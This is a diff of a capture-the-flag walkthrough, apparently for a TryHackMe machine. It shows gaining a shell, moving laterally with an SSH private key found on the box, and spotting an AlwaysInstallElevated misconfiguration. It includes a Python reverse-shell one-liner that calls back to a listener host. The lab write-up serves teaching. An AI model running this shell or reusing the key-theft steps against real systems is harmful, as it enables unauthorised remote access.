@@ -160,11 +160,42 @@ After logging in I found the same files which I observed when I enumerated throu
 
 I found that there are modules running inside the file & we can also our own module which will be executed by Python, so I used one of the Python reverse shell one-liner & added to the file.
 
-```python
+```python3
 import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
 ```
 
 After running the above code I quickly got the shell back to my netcat listener as a "dev-datasci" user.(pwn3d!🙂)
 ![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/b034c290-d9a1-4403-a173-c1b317f3abcc)
+
+### User access:
+
+When I got the initial access as the "dev-datasci" user I searched for other user inside the machine but didn't found any of the user, I checked for the running processes & found very few processes running. 
+I thought may be I am in a docker container but when I check further I found that I am inside a Windows machine & running inside windows subsystem for Linux (WSL):
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/4a4b80e1-7c6e-4bfb-a4d2-15a86ea02bd4)
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/49e57493-30ca-45a7-adb0-c5d9467ef58f)
+
+I then checked the home directory of the user as part of manual enumeration & found a file "dev-datasci-lowpriv_id_ed25519", which contains the private SSH key.
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/3880ef50-322a-4a68-89ad-904361f04f73)
+
+I copied the key in my local machine with the file name id_rsa, modified the permissions to "chmod 600" to use it in the SSH logon & then performed the SSH logon using the user: "dev-datasci-lowpriv".
+
+```bash
+ssh -i id_rsa dev-datasci-lowpriv@weasel.thm
+```
+
+I logged in successfully & got the cmd prompt as user "dev-datasci-lowpriv". (pwn3d!🙂)
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/6b6ec7de-688f-4492-9774-211d025a1913)
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+## Privilege Escalation:
+
+After gaining access to the low privilege user & getting user flag, I started seraching for the privilege esclation vectors.
+I executed WinPeas to check for the all possible privilege escalation vectors & observed some juicy results in "AlwaysInstallElevated" privilege. I found that AlwaysInstallElevated is set to '1' in both HKLM & HKCU.
+
+![image](https://github.com/F41zK4r1m/TryHackMe/assets/87700008/1847e73d-72f2-4c3c-9eb2-be7bc8ce9f30)
+
 
 
